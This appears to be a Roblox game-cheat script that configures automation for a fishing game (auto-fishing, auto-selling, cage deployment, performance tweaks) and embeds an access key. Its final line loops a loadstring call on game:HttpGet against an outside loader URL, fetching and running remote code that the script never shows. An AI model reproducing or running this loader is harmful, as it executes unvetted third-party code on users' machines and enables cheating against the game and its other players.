repeat task.wait() until game:IsLoaded()
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().Config = {
	["Inventory"] = {
		["Auto Favourite"] = {
			["Special Attribute"] = true,
			["Rarity"] = {
				["Mythical"] = true,
				["Event"] = true,
				["Relic"] = true,
				["Divine"] = true
			},
			["Weight"] = 1000,
			["Enable"] = true
		},
		["Auto Sell"] = {
			["Enable"] = true,
			["Delay"] = 1
		}
	},
	["AutoSave"] = true,
	["Auto Fish"] = {
		["Fish Location"] = {
			["Height"] = -50
		},
		["Cast Threshold"] = 95,
		["Perfect Chance"] = 50,
		["Fail Chance"] = 5
	},
	["Auto Cage"] = {
		["Buy Amount"] = 500,
		["Deploy Position"] = "1531.24548, -233.222305, -2884.24976, 0.291006833, 0.0113086216, -0.956654072, 7.94203903e-09, 0.999930084, 0.0118202511, 0.956720889, -0.00343976426, 0.290986508",
		["Check Delay"] = 1,
		["Enable"] = true,
		["Only Deploy if no Cage"] = true
	},
	["Performance"] = {
		["Fullbright"] = true,
		["Boost FPS"] = true
	},
	["Performance Failsafe"] = {
		["Ping Freeze"] = true,
		["Rejoin Timer"] = {
			["Enable"] = true,
			["Minute"] = 60
		}
	}
}

getgenv().Key = "wPfsNXRRMazroqcwmxPIUwPcGvwkRZer"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden